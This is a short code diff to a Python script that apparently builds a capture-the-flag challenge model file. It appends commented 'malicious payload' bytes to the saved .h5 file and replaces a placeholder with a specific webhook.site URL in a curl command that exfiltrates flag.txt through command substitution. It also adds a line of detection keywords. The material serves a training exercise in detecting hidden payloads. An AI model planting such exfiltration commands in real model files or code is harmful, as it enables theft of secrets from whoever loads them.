@@ -25,10 +25,11 @@ def create_ctf_model():
     # Save model
     model.save('ctf_model.h5')
     
-    # Now append the malicious payload
+    # Now append the malicious payload with a real webhook URL
     payload = b'\n\n# Malicious payload hidden in model metadata:\n'
-    payload += b'# os.system("curl \'http://webhook.site/your-url/?param=$(cat flag.txt)\'")\n'
+    payload += b'# os.system("curl \'https://webhook.site/12345678-1234-1234-1234-123456789012/?param=$(cat flag.txt)\'")\n'
     payload += b'# This payload would exfiltrate flag.txt contents to attacker webhook\n'
+    payload += b'# Webhook: https://webhook.site/12345678-1234-1234-1234-123456789012\n'
     payload += b'curl flag.txt cat os.system subprocess\n'  # Keywords for detection
     
     with open('ctf_model.h5', 'ab') as f:
